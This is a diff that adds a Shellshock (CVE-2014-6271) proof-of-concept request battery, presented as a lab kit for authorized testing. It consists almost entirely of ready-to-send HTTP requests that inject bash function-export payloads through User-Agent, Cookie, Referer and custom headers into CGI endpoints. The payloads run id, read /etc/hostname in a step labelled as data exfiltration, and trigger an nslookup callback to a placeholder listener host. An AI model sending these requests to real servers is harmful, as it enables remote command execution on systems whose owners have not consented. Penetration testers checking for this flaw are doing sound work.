@@ -1,0 +1,42 @@
+###
+# Safe PoC -> x8bitranjit
+# ============================================================================
+# Shellshock (CVE-2014-6271) PoC battery - Linux/CGI specific.
+# x8bitranjit lab style. Authorized testing only.
+#
+# WHAT THIS DEMONSTRATES: bash exports request headers as environment
+# variables; a crafted "function export" trailer executes on shell startup.
+# Affects CGI endpoints that spawn bash (Apache mod_cgi /cgi-bin/, cPanel,
+# legacy appliances, DHCP/web.sh call-outs).
+#
+# WHERE TO USE: /cgi-bin/*, /cgi-mod/*, appliance admin CGIs - any endpoint
+# whose Server header shows Apache+CGI handling.
+#
+# WHAT TO EDIT:  target.com  -> your authorized target;  /cgi-bin/status ->
+# an actual CGI path. BENIGN marker only (/usr/bin/id or echo).
+#
+# CONFIRM: uid=... in the response, or OOB callback from the target.
+# KIT CROSS-REF: CommandInjection_CHECKLIST CMDI-026; nuclei -tags shellshock.
+# ============================================================================
+
+### 1) classic User-Agent injection (in-band marker)
+GET /cgi-bin/status HTTP/1.1
+Host: target.com
+User-Agent: () { :;}; echo; echo; /bin/echo CVE-2014-6271-benign-marker; /usr/bin/id
+
+### 2) OOB variant (EDIT: YOUR-OOB-HOST.example.invalid -> your listener)
+GET /cgi-bin/status HTTP/1.1
+Host: target.com
+User-Agent: () { :;}; /usr/bin/nslookup shellshock.YOUR-OOB-HOST.example.invalid
+
+### 3) other exported headers (Cookie / Referer / custom)
+GET /cgi-bin/status HTTP/1.1
+Host: target.com
+Cookie: () { :;}; /usr/bin/id
+Referer: () { :;}; /usr/bin/id
+X-Custom: () { :;}; /usr/bin/id
+
+### 4) data-exfil shape (benign single read, authorized only)
+GET /cgi-bin/status HTTP/1.1
+Host: target.com
+User-Agent: () { :;}; /bin/cat /etc/hostname; /usr/bin/id
